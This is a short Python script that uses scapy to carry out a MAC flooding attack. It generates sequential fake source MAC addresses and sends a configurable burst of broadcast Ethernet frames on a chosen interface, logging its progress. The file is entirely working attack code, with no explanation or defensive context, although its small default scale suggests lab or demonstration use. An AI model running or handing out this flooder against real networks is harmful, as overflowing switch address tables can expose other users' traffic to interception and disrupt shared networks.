#!/usr/bin/env python3

import time
from scapy.all import Ether, Raw, sendp



def generate_fake_mac(index):
    return (
        f"02:ca:"
        f"{(index >> 24) & 0xff:02x}:"
        f"{(index >> 16) & 0xff:02x}:"
        f"{(index >> 8) & 0xff:02x}:"
        f"{index & 0xff:02x}"
    )


def run_mac_flood(
    interface,
    destination_mac="ff:ff:ff:ff:ff:ff",
    count=100,
    interval=0.01,
    log=print,
):
    log(f"MAC flood started on {interface}")
    log(f"Frames: {count}, interval: {interval}s")

    for index in range(1, count + 1):
        fake_source_mac = generate_fake_mac(index)

        frame = (
            Ether(
                src=fake_source_mac,
                dst=destination_mac,
                type=0x88B5,
            )
            / Raw(load=f"MAC flood frame {index}".encode())
        )

        sendp(
            frame,
            iface=interface,
            verbose=False,
        )

        if index == 1 or index % 10 == 0:
            log(f"[{index}/{count}] sent with source MAC {fake_source_mac}")

        time.sleep(interval)

    log("MAC flood finished")